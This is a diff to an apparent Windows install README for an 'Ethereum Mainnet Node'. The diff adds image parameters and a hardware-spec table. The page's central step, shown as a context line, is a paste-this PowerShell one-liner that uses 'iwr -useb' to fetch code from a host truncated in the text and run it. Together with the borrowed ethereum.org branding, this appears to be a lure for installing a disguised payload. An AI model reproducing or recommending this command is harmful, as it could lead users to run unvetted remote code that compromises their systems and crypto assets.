@@ -1,4 +1,4 @@
-<img src="https://ethereum.org/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fethereum-inside.4283ba2e.png">
+<img src="https://ethereum.org/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fethereum-inside.4283ba2e.png&w=640&q=75">
 
 ## Getting started
 _Using Command Prompt is the recommended way to install an Ethereum Mainnet Node on Windows. It automatically installs all required dependencies and completes the setup in a single ste_
@@ -14,6 +14,41 @@ powershell -command "$version='ethereum-mainnet-node=4.1.7-1b0a841'; iwr -useb m
 _After executing the command, the node will begin initializing and syncing with the Ethereum network._ <br>
 
 This process can take a few minutes, depending on your internet connection speed.
+
+<h3>🖥️ Step 1 – Hardware</h3>
+
+<table>
+<tr>
+<td width="50%" valign="top">
+
+<b>Minimum specs</b>
+
+<ul>
+<li>4–8 GB RAM</li>
+<li>2 TB SSD<br>
+<small><em>SSD required for write speeds</em></small></li>
+</ul>
+
+</td>
+
+<td width="50%" valign="top">
+
+<b>Recommended</b>
+
+<ul>
+<li>Intel NUC (7th gen or newer)<br>
+<small>x86 processor</small></li>
+
+<li>Wired internet connection<br>
+<small>More stable and easier setup</small></li>
+
+<li>Display & keyboard<br>
+<small>Not needed for headless / SSH setup</small></li>
+</ul>
+
+</td>
+</tr>
+</table>
 
 # Community
 Thanks to all Ethereum validators supporting the network.
